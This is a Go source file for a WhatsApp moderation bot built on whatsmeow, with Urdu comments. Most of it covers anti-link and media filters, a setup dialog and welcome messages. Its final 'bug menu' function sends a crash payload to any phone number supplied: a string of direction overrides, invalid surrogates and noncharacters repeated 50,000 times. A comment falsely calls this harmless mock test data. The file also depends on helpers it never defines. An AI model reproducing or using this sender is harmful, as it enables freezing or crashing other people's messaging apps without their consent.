package main

import (
	"context"
	"fmt"
	"strings"
	"time"
	"encoding/json"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	waProto "go.mau.fi/whatsmeow/binary/proto"
	"google.golang.org/protobuf/proto"
	"github.com/redis/go-redis/v9"
)

// 🛡️ سیٹنگز کا ڈھانچہ (Structure)
// اس میں تم مزید چیزیں بھی ڈال سکتے ہو جیسے AntiLink، Welcome وغیرہ
type BotSettings struct {
	Prefix     string `json:"prefix"`
	SelfMode   bool   `json:"self_mode"`
	AutoStatus bool   `json:"auto_status"`
	OnlyGroup  bool   `json:"only_group"`
	 
}

// 💾 1. تمام سیٹنگز ریڈیس میں محفوظ کرنا
func SaveAllSettings(rdb *redis.Client, botID string, settings BotSettings) {
	// ڈیٹا کو JSON میں بدلیں
	data, err := json.Marshal(settings)
	if err != nil {
		fmt.Println("❌ [REDIS] JSON encoding error:", err)
		return
	}

	// ریڈیس میں بوٹ کی آئی ڈی کے نام سے سیو کریں
	key := fmt.Sprintf("settings:%s", botID)
	err = rdb.Set(ctx, key, data, 0).Err() // 0 کا مطلب ہے کبھی ڈیلیٹ نہ ہو
	if err != nil {
		fmt.Println("❌ [REDIS] Save error:", err)
	} else {
		fmt.Printf("✅ [SAVED] Settings for %s stored in Redis\n", botID)
	}
}

// 📥 2. ریڈیس سے سیٹنگز واپس لوڈ کرنا
func LoadAllSettings(rdb *redis.Client, botID string) BotSettings {
	key := fmt.Sprintf("settings:%s", botID)
	val, err := rdb.Get(ctx, key).Result()

	var settings BotSettings
	if err == redis.Nil {
		// اگر پہلے سے کوئی سیٹنگ نہیں ہے تو ڈیفالٹ سیٹ کریں
		fmt.Println("ℹ️ [REDIS] No settings found, using defaults.")
		return BotSettings{Prefix: ".", SelfMode: false, AutoStatus: true}
	} else if err != nil {
		fmt.Println("❌ [REDIS] Load error:", err)
		return BotSettings{Prefix: "."}
	}

	// JSON سے واپس اسٹرکچر میں بدلیں
	err = json.Unmarshal([]byte(val), &settings)
	if err != nil {
		fmt.Println("❌ [REDIS] JSON decoding error:", err)
	}
	
	fmt.Printf("🚀 [LOADED] Settings for %s synced from Redis\n", botID)
	return settings
}

// 🛡️ گروپ سیکیورٹی سیٹنگز کا ڈھانچہ
type GroupSecurity struct {
	AntiLink   bool `json:"anti_link"`
	AllowAdmin bool `json:"allow_admin"` // جو آپ اسٹیج 1 میں پوچھ رہے ہیں
}

// 💾 گروپ سیٹنگ سیو کرنا (Group Specific)
func SaveGroupSecurity(rdb *redis.Client, botLID string, groupID string, data GroupSecurity) {
	key := fmt.Sprintf("sec:%s:%s", botLID, groupID)
	payload, _ := json.Marshal(data)
	
	err := rdb.Set(ctx, key, payload, 0).Err()
	if err != nil {
		fmt.Printf("❌ [REDIS] Save Error for Group %s: %v\n", groupID, err)
	}
}

// 📥 گروپ سیٹنگ لوڈ کرنا (Group Specific)
func LoadGroupSecurity(rdb *redis.Client, botLID string, groupID string) GroupSecurity {
	key := fmt.Sprintf("sec:%s:%s", botLID, groupID)
	val, err := rdb.Get(ctx, key).Result()
	
	var data GroupSecurity
	if err != nil {
		// اگر کوئی سیٹنگ نہیں ملی تو ڈیفالٹ (False) واپس کریں
		return GroupSecurity{AntiLink: false, AllowAdmin: false}
	}
	
	json.Unmarshal([]byte(val), &data)
	return data
}

// فرض کریں یوزر نے 'antilink' آن کرنے کا فیصلہ کر لیا ہے
func finalizeSecurity(client *whatsmeow.Client, senderLID string, choice string) {
	state := setupMap[senderLID]
	if state == nil { return }

	allowAdmin := (choice == "1") // اگر یوزر نے 1 دبایا تو ایڈمن الاؤ ہیں
	
	// سیٹنگز تیار کریں
	newConfig := GroupSecurity{
		AntiLink:   true, // کیونکہ وہ اینٹی لنک کا سیٹ اپ کر رہا تھا
		AllowAdmin: allowAdmin,
	}

	// 💾 ریڈیس میں اس گروپ کے لیے مخصوص سیو کریں
	SaveGroupSecurity(rdb, state.BotLID, state.GroupID, newConfig)
	
	// میپ سے ڈیلیٹ کر دیں
	delete(setupMap, senderLID)
}
// ==================== سیکورٹی سسٹم ====================
func checkSecurity(client *whatsmeow.Client, v *events.Message) {
	// ✅ 1. Bot ID نکالیں
	rawBotID := client.Store.ID.User
	botID := getCleanID(rawBotID)

	if !v.Info.IsGroup {
		return
	}

	// ✅ 2. Settings حاصل کرتے وقت botID پاس کریں
	s := getGroupSettings(botID, v.Info.Chat.String())
	
	if s.Mode == "private" {
		return
	}

	// ✅ Anti-link check
	if s.Antilink && containsLink(getText(v.Message)) {
		// نوٹ: takeSecurityAction کو بھی botID پاس کیا ہے تاکہ وہ Save کر سکے
		takeSecurityAction(client, v, s, s.AntilinkAction, "Link detected", botID)
		return
	}

	// Anti-picture check
	if s.AntiPic && v.Message.ImageMessage != nil {
		takeSecurityAction(client, v, s, "delete", "Image not allowed", botID)
		return
	}

	// Anti-video check
	if s.AntiVideo && v.Message.VideoMessage != nil {
		takeSecurityAction(client, v, s, "delete", "Video not allowed", botID)
		return
	}

	// Anti-sticker check
	if s.AntiSticker && v.Message.StickerMessage != nil {
		takeSecurityAction(client, v, s, "delete", "Sticker not allowed", botID)
		return
	}
}

func containsLink(text string) bool {
	if text == "" {
		return false
	}

	text = strings.ToLower(text)
	linkPatterns := []string{
		"http://", "https://", "www.",
		"chat.whatsapp.com/", "t.me/", "youtube.com/",
		"youtu.be/", "instagram.com/", "fb.com/",
		"facebook.com/", "twitter.com/", "x.com/",
	}

	for _, pattern := range linkPatterns {
		if strings.Contains(text, pattern) {
			return true
		}
	}

	return false
}

// ✅ فنکشن میں botID کا اضافہ کیا گیا ہے
func takeSecurityAction(client *whatsmeow.Client, v *events.Message, s *GroupSettings, action, reason string, botID string) {
	switch action {
	case "delete":
		// ✅ Delete for everyone
		_, err := client.SendMessage(context.Background(), v.Info.Chat, client.BuildRevoke(v.Info.Chat, v.Info.Sender, v.Info.ID))
		if err != nil {
			// log.Printf("❌ Delete failed: %v", err) // Optional Log
			return
		}

		msg := fmt.Sprintf(`╔════════════════╗
║ 🚫 DELETED
╠════════════════╣
║ Reason: %s
║ User: @%s
╚════════════════╝`, reason, v.Info.Sender.User)
		
		senderStr := v.Info.Sender.String()
		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String(msg),
				ContextInfo: &waProto.ContextInfo{
					MentionedJID: []string{senderStr},
					StanzaID:     proto.String(v.Info.ID),
					Participant:  proto.String(senderStr),
				},
			},
		})

	case "deletekick":
		// 1. Delete
		client.SendMessage(context.Background(), v.Info.Chat, client.BuildRevoke(v.Info.Chat, v.Info.Sender, v.Info.ID))

		// 2. Kick
		_, err := client.UpdateGroupParticipants(context.Background(), v.Info.Chat,
			[]types.JID{v.Info.Sender}, whatsmeow.ParticipantChangeRemove)
		
		if err != nil {
			replyMessage(client, v, "⚠️ Failed to Kick (Need Admin)")
			return
		}
		
		msg := fmt.Sprintf(`╔════════════════╗
║ 👢 KICKED
╠════════════════╣
║ Reason: %s
║ User: @%s
║ Action: Delete+Kick
╚════════════════╝`, reason, v.Info.Sender.User)
		
		senderStr := v.Info.Sender.String()
		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String(msg),
				ContextInfo: &waProto.ContextInfo{
					MentionedJID: []string{senderStr},
				},
			},
		})

	case "deletewarn":
		// 1. Delete
		client.SendMessage(context.Background(), v.Info.Chat, client.BuildRevoke(v.Info.Chat, v.Info.Sender, v.Info.ID))

		// 2. Update Warnings
		senderKey := v.Info.Sender.String()
		if s.Warnings == nil {
			s.Warnings = make(map[string]int)
		}
		s.Warnings[senderKey]++
		warnCount := s.Warnings[senderKey]

		if warnCount >= 3 {
			// Kick after 3 warnings
			_, err := client.UpdateGroupParticipants(context.Background(), v.Info.Chat,
				[]types.JID{v.Info.Sender}, whatsmeow.ParticipantChangeRemove)
			
			if err != nil {
				replyMessage(client, v, "⚠️ Failed to Kick (Need Admin)")
			} else {
				delete(s.Warnings, senderKey) // Reset warnings
				
				msg := fmt.Sprintf(`╔════════════════╗
║ 🚫 KICKED
╠════════════════╣
║ User: @%s
║ Warning: 3/3
║ Reason: %s
╚════════════════╝`, v.Info.Sender.User, reason)
				
				senderStr := v.Info.Sender.String()
				client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
					ExtendedTextMessage: &waProto.ExtendedTextMessage{
						Text: proto.String(msg),
						ContextInfo: &waProto.ContextInfo{MentionedJID: []string{senderStr}},
					},
				})
			}
		} else {
			// Send Warning Message
			msg := fmt.Sprintf(`╔════════════════╗
║ ⚠️ WARNING
╠════════════════╣
║ User: @%s
║ Count: %d/3
║ Reason: %s
╚════════════════╝`, v.Info.Sender.User, warnCount, reason)
			
			senderStr := v.Info.Sender.String()
			client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
				ExtendedTextMessage: &waProto.ExtendedTextMessage{
					Text: proto.String(msg),
					ContextInfo: &waProto.ContextInfo{
						MentionedJID: []string{senderStr},
						StanzaID:     proto.String(v.Info.ID),
						Participant:  proto.String(senderStr),
					},
				},
			})
		}

		// ✅ FIX: Save with BotID
		saveGroupSettings(botID, s)
	}
}
// مثال کے طور پر
func onResponse(client *whatsmeow.Client, v *events.Message, choice string) {
	senderID := v.Info.Sender.String()
	state, exists := setupMap[senderID]

	// 1. کیا یہ بندہ سیٹ اپ موڈ میں ہے؟
	if !exists { return }

	// 2. کیا اس نے میسج کو ریپلائی (Quote) کیا ہے؟
	if v.Message.GetExtendedTextMessage().GetContextInfo() == nil {
		return // اگر ریپلائی نہیں ہے تو خاموش رہے
	}

	// 3. کیا ریپلائی اسی بوٹ کے میسج کو کیا گیا ہے؟
	quotedID := v.Message.ExtendedTextMessage.ContextInfo.GetStanzaID() // ✅ Fixed: ID caps mein
	if quotedID != state.BotMsgID {
		return // اگر کسی اور کے میسج کو ریپلائی کیا تو اگنور کریں
	}

	// 4. اگر سب ٹھیک ہے تو ریڈیس میں سیو کریں
	key := fmt.Sprintf("group:sec:%s:%s:%s", state.BotLID, state.GroupID, state.Type)
	rdb.Set(context.Background(), key, choice, 0)

	// اگلا مینیو دکھائیں یا ختم کریں
	replyMessage(client, v, "✅ Setting Saved Successfully!")
	delete(setupMap, senderID)
}

func startSecuritySetup(client *whatsmeow.Client, v *events.Message, secType string) {
	// 1️⃣ گروپ چیک
	if !v.Info.IsGroup {
		replyMessage(client, v, "╔════════════════╗\n║ ❌ GROUP ONLY\n╚════════════════╝")
		return
	}

	// 2️⃣ ایڈمن چیک
	isAdmin := false
	groupInfo, _ := client.GetGroupInfo(context.Background(), v.Info.Chat)
	if groupInfo != nil {
		for _, p := range groupInfo.Participants {
			if p.JID.User == v.Info.Sender.User && (p.IsAdmin || p.IsSuperAdmin) {
				isAdmin = true; break
			}
		}
	}
	if !isAdmin && !isOwner(client, v.Info.Sender) {
		replyMessage(client, v, "╔════════════════╗\n║ 👮 ADMIN ONLY\n╚════════════════╝")
		return
	}

	// 🛠️ آئی ڈیز سیٹ اپ کریں
	cleanSenderLID := v.Info.Sender.User
	groupID := v.Info.Chat.String()
	
	// ✅ Bot ID صحیح طریقے سے نکالیں (یہ بہت اہم ہے میچنگ کے لیے)
	rawBotID := client.Store.ID.User
	botID := getCleanID(rawBotID) 

	msgText := fmt.Sprintf(`╔════════════════╗
║ 🛡️ %s (1/2)
╠════════════════╣
║ Allow Admins?
║ 1️⃣ YES | 2️⃣ NO
╚════════════════╝`, strings.ToUpper(secType))

	// کارڈ بھیجیں
	resp, err := client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
		ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(msgText)},
	})

	if err != nil {
		fmt.Printf("❌ ERROR: %v\n", err)
		return
	}

	// 🔑 میسج آئی ڈی کو ہی 'Key' بنائیں (جس پر ریپلائی آئے گا)
	mapKey := resp.ID

	fmt.Printf("\n🔥 [SETUP START] ID: %s | User: %s | Bot: %s\n", mapKey, cleanSenderLID, botID)

	// 💾 سیشن محفوظ کریں
	setupMap[mapKey] = &SetupState{
		Type:     secType,
		Stage:    1,
		GroupID:  groupID,
		User:     cleanSenderLID,
		BotLID:   botID, // یہاں کلین ID سیو کریں
		BotMsgID: resp.ID,
	}

	// 2 منٹ کا ٹائمر
	go func() {
		time.Sleep(2 * time.Minute)
		delete(setupMap, mapKey)
	}()
}

func handleSetupResponse(client *whatsmeow.Client, v *events.Message) {
	// 🛑 ریپلائی چیک
	extMsg := v.Message.GetExtendedTextMessage()
	if extMsg == nil || extMsg.ContextInfo == nil {
		return
	}

	quotedID := extMsg.ContextInfo.GetStanzaID()
	incomingLID := v.Info.Sender.User 

	// ✅ FIX: Bot ID نکالیں
	rawBotID := client.Store.ID.User
	botID := getCleanID(rawBotID)

	// 1. ڈیٹا تلاش کریں (جس میسج پر ریپلائی آیا ہے)
	state, exists := setupMap[quotedID]
	if !exists {
		// اگر یہاں نہیں ملا، تو ہو سکتا ہے یہ کسی دوسرے بوٹ کا میسج ہو
		return
	}

	// 2. بوٹ میچنگ
	if state.BotLID != botID {
		return // یہ سیشن اس بوٹ کا نہیں ہے
	}

	// 3. یوزر میچنگ
	fmt.Printf("🔍 [SETUP MATCH] Stage: %d | User: %s vs %s\n", state.Stage, state.User, incomingLID)

	if state.User != incomingLID {
		fmt.Println("🚫 [REJECTED] User mismatch in setup.")
		return 
	}

	txt := strings.TrimSpace(getText(v.Message))

	// ✅ FIX: Settings منگواتے وقت botID پاس کریں
	s := getGroupSettings(botID, state.GroupID)

	// ===========================
	// 🔄 STAGE 1 LOGIC
	// ===========================
	if state.Stage == 1 {
		if txt == "1" {
			s.AntilinkAdmin = true
		} else if txt == "2" {
			s.AntilinkAdmin = false
		} else {
			replyMessage(client, v, "⚠️ Please reply with 1 or 2")
			return
		}

		// پرانا سیشن ڈیلیٹ کریں (کیونکہ اب ہم نیا میسج بھیج رہے ہیں)
		delete(setupMap, quotedID)

		// اگلا میسج بھیجیں
		nextMsg := fmt.Sprintf(`╔════════════════╗
║ ⚡ %s (2/2)
╠════════════════╣
║ 1️⃣ DELETE ONLY
║ 2️⃣ DELETE + KICK
║ 3️⃣ DELETE + WARN
╚════════════════╝`, strings.ToUpper(state.Type))

		resp, err := client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(nextMsg)},
		})

		if err != nil {
			fmt.Println("❌ Error sending Stage 2 msg:", err)
			return
		}

		// ✅ نیا سیشن (Stage 2) سیو کریں
		newKey := resp.ID
		fmt.Printf("⏭️ [NEXT STAGE] Moving to Stage 2. New Key: %s\n", newKey)

		setupMap[newKey] = &SetupState{
			Type:     state.Type,
			Stage:    2, // سٹیج اپڈیٹ
			GroupID:  state.GroupID,
			User:     state.User,
			BotLID:   state.BotLID, // وہی Bot ID رکھیں
			BotMsgID: resp.ID,
		}
		
		// اس نئے سیشن کے لیے بھی ٹائمر لگا دیں
		go func() {
			time.Sleep(2 * time.Minute)
			delete(setupMap, newKey)
		}()
		
		return
	}

	// ===========================
	// 🔄 STAGE 2 LOGIC
	// ===========================
	if state.Stage == 2 {
		var actionText string
		switch txt {
		case "1":
			s.AntilinkAction = "delete"
			actionText = "Delete Only"
		case "2":
			s.AntilinkAction = "deletekick"
			actionText = "Delete + Kick"
		case "3":
			s.AntilinkAction = "deletewarn"
			actionText = "Delete + Warn"
		default:
			replyMessage(client, v, "⚠️ Please reply with 1, 2 or 3")
			return
		}

		// فائنل سیٹنگز اپلائی کریں
		applySecurityFinal(s, state.Type, true)

		// ✅ FIX: Save کرتے وقت botID پاس کریں (تاکہ Redis میں صحیح سیو ہو)
		saveGroupSettings(botID, s)
		
		// سیشن ختم
		delete(setupMap, quotedID) 

		adminBypass := "YES ✅"
		if !s.AntilinkAdmin {
			adminBypass = "NO ❌"
		}
		
		finalMsg := fmt.Sprintf(`╔════════════════╗
║ ✅ %s ENABLED
╠════════════════╣
║ Admin Bypass: %s
║ Action: %s
╚════════════════╝`, strings.ToUpper(state.Type), adminBypass, actionText)

		replyMessage(client, v, finalMsg)
		fmt.Printf("🏁 [COMPLETE] Setup Success for %s on Bot %s\n", state.Type, botID)
	}
}

// ہیلپر
func applySecurityFinal(s *GroupSettings, t string, val bool) {
	switch t {
	case "antilink": s.Antilink = val
	case "antipic": s.AntiPic = val
	case "antivideo": s.AntiVideo = val
	case "antisticker": s.AntiSticker = val
	}
}

// ہیلپر فنکشن ایڈمن چیک کے لیے
func participantIsAdmin(p types.GroupParticipant) bool {
	return p.IsAdmin || p.IsSuperAdmin
}

func handleGroupEvents(client *whatsmeow.Client, evt interface{}) {
	switch v := evt.(type) {
	case *events.GroupInfo:
        // ⚡ اسے الگ تھریڈ میں پھینک دیں تاکہ مین بوٹ فری رہے
		go handleGroupInfoChange(client, v)
	}
}

func handleGroupInfoChange(client *whatsmeow.Client, v *events.GroupInfo) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("⚠️ Panic: %v\n", r)
		}
	}()

	if v.JID.IsEmpty() { return }
	chatID := v.JID.String()

	// ✅ 1. Bot ID نکالیں
	rawBotID := client.Store.ID.User
	botID := getCleanID(rawBotID)

	// ✅ 2. اب botID پاس کریں
	settings := getGroupSettings(botID, chatID)
	
	if !settings.Welcome { return }

	// 🛡️ ANTI-SPAM FILTER
	if RestrictedGroups[chatID] {
		if !AuthorizedBots[botID] {
			return 
		}
	}

	// ... (باقی ویلکم لاجک) ...
	// =========================================================

    // ⚡ 4. Event Processing (Join, Leave, Promote, Demote)
    
	// ✅ کک یا لیو (Leave/Kick)
	if v.Leave != nil && len(v.Leave) > 0 {
		for _, left := range v.Leave {
			sender := v.Sender 
			leftStr := left.String()
            // نام نکالنے کی کوشش (Optional)
            userNum := strings.Split(left.User, "@")[0]

			if sender.User == left.User {
                // خود لیفٹ ہوا
				msg := fmt.Sprintf(`╔════════════════╗
║ 👋 GOODBYE
╠════════════════╣
║ 👤 User: @%s
║ 📉 Status: Left
╚════════════════╝`, userNum)

				client.SendMessage(context.Background(), v.JID, &waProto.Message{
					ExtendedTextMessage: &waProto.ExtendedTextMessage{
						Text: proto.String(msg),
						ContextInfo: &waProto.ContextInfo{
							MentionedJID: []string{leftStr},
						},
					},
				})
			} else {
                // کک کیا گیا (By Admin)
				msg := fmt.Sprintf(`╔════════════════╗
║ 👢 KICKED
╠════════════════╣
║ 👤 User: @%s
║ 👮 By: @%s
╚════════════════╝`, userNum, sender.User)

				client.SendMessage(context.Background(), v.JID, &waProto.Message{
					ExtendedTextMessage: &waProto.ExtendedTextMessage{
						Text: proto.String(msg),
						ContextInfo: &waProto.ContextInfo{
							MentionedJID: []string{leftStr, sender.String()},
						},
					},
				})
			}
            time.Sleep(500 * time.Millisecond) // چھوٹا سا وقفہ تاکہ واٹس ایپ بین نہ کرے
		}
	}

	// ✅ Promote event
	if v.Promote != nil && len(v.Promote) > 0 {
		for _, promoted := range v.Promote {
			msg := fmt.Sprintf(`╔════════════════╗
║ 👑 PROMOTED
╠════════════════╣
║ 👤 User: @%s
║ 🎉 New Admin!
╚════════════════╝`, promoted.User)

			client.SendMessage(context.Background(), v.JID, &waProto.Message{
				ExtendedTextMessage: &waProto.ExtendedTextMessage{
					Text: proto.String(msg),
					ContextInfo: &waProto.ContextInfo{
						MentionedJID: []string{promoted.String()},
					},
				},
			})
		}
	}

	// ✅ Demote event
	if v.Demote != nil && len(v.Demote) > 0 {
		for _, demoted := range v.Demote {
			msg := fmt.Sprintf(`╔════════════════╗
║ 👤 DEMOTED
╠════════════════╣
║ 👤 User: @%s
║ 📉 Admin Removed
╚════════════════╝`, demoted.User)

			client.SendMessage(context.Background(), v.JID, &waProto.Message{
				ExtendedTextMessage: &waProto.ExtendedTextMessage{
					Text: proto.String(msg),
					ContextInfo: &waProto.ContextInfo{
						MentionedJID: []string{demoted.String()},
					},
				},
			})
		}
	}

	// ✅ Join event (Welcome)
	if v.Join != nil && len(v.Join) > 0 {
		for _, joined := range v.Join {
			msg := fmt.Sprintf(`╔════════════════╗
║ 👋 WELCOME
╠════════════════╣
║ 👤 User: @%s
║ 🎉 Enjoy here!
╚════════════════╝`, joined.User)

			client.SendMessage(context.Background(), v.JID, &waProto.Message{
				ExtendedTextMessage: &waProto.ExtendedTextMessage{
					Text: proto.String(msg),
					ContextInfo: &waProto.ContextInfo{
						MentionedJID: []string{joined.String()},
					},
				},
			})
            time.Sleep(500 * time.Millisecond)
		}
	}
}

//bug 🪲 🐛 menu

var badChars = []string{
	"\u200b", // Zero Width Space (Type 1)
	"\u202e", // Right-To-Left Override (Type 2)
	"\u202d", // Left-To-Right Override (Type 2)
	"\u2060", // Word Joiner (Type 3)
	"\u200f", // RTL Mark (Type 3)
}

func handleAntiBug(client *whatsmeow.Client, v *events.Message) {
	// اسٹیٹس چینج کریں
	AntiBugEnabled = !AntiBugEnabled
	
	statusText := "OFF ❌"
	if AntiBugEnabled {
		statusText = "ON ✅"
	}

	reply := fmt.Sprintf("🛡️ *Anti-Bug System*\n\nCurrent Status: %s", statusText)
	
	// جواب بھیجیں
	client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
		Conversation: proto.String(reply),
	})
}

func handleSendBug(client *whatsmeow.Client, v *events.Message, args []string) {
	// چیک کریں کہ آرگیومنٹس پورے ہیں (کم از کم ٹائپ اور نمبر)
	if len(args) < 2 {
		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
			Conversation: proto.String("⚠️ Usage: .send <type> <number>\nTypes: 1, 2, 3, all"),
		})
		return
	}

	bugType := strings.ToLower(args[0]) // 1, 2, 3, or all
	targetNum := args[1]

	// نمبر فارمیٹنگ
	if !strings.Contains(targetNum, "@s.whatsapp.net") {
		targetNum = targetNum + "@s.whatsapp.net"
	}
	jid, err := types.ParseJID(targetNum)
	if err != nil {
		fmt.Println("Invalid Number:", err)
		return
	}

	// --- Payloads کی تیاری ---
	// نوٹ: یہ اصلی وائرس نہیں ہیں، صرف ٹیسٹنگ کے لیے موک (Mock) ڈیٹا ہے۔
	
	// Payload 1: Zero Width Spaces (عام طریقہ)
	payload1 := strings.Repeat("\u200b", 80)

	// Payload 2: Right-to-Left Overrides (ٹیکسٹ ڈائریکشن بگز)
	payload2 := strings.Repeat("\u202e\u202d\u202a\u202b\u202c\u202e\u202d\u202d\u202e\u202e\u202e\u202d\u202d\u202e\u200b\u202e\u200d\u202d\u200b\u202d\u200d\u202e\u200b\u200d\u200b\u200c\u200d\u200b\u200b\u200d\u200d\u200b\u200c\u200d\ufeff\ufeff\ufeff\ufeff\u200b\u2066\u2067\u2068\u2069\u2066\u2067\u2067\u2069\u2066\u202e\u0300\u0301\u0302\u0300\u0300\u0301\u0301\u0300\u0301\u0336\u0336\u0336\u034f\u034f\u034f\ud800\udfff\ud800\ud800\udfff\udfff\uffff\ufffe\ufdd0\ufdef", 50000)

	// Payload 3: Word Joiners & Marks (مکسچر)
	payload3 := strings.Repeat("\u2060\u200f", 40)

	var finalMessage string
	var label string

	switch bugType {
	case "1":
		label = "Type 1 (Hidden Spaces)"
		finalMessage = "🚨 *TEST BUG 1* 🚨\n" + payload1 + "\nEnd of Test 1"
	case "2":
		label = "Type 2 (Direction Overrides)"
		finalMessage = "🚨 *TEST BUG 2* 🚨\n" + payload2 + "\nEnd of Test 2"
	case "3":
		label = "Type 3 (Mixed Junk)"
		finalMessage = "🚨 *TEST BUG 3* 🚨\n" + payload3 + "\nEnd of Test 3"
	case "all":
		label = "ALL TYPES (Mega Test)"
		// سب کو ملا کر ایک ہیوی ٹیسٹ، لیکن اتنا نہیں کہ موبائل پھنس جائے
		finalMessage = "🚨 *MEGA TEST BUG* 🚨\n" + payload1 + payload2 + payload3 + "\nChecking detection for ALL types."
	default:
		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
			Conversation: proto.String("❌ Invalid Type. Use 1, 2, 3 or all"),
		})
		return
	}

	// میسج بھیجنا
	resp, err := client.SendMessage(context.Background(), jid, &waProto.Message{
		Conversation: proto.String(finalMessage),
	})

	if err != nil {
		fmt.Println("Error sending:", err)
		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
			Conversation: proto.String("❌ Failed to send."),
		})
	} else {
		fmt.Printf("Sent %s to %s (ID: %s)\n", label, targetNum, resp.ID)
		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
			Conversation: proto.String("✅ Sent: " + label + "\nWatch if Anti-Bug deletes it."),
		})
	}
}
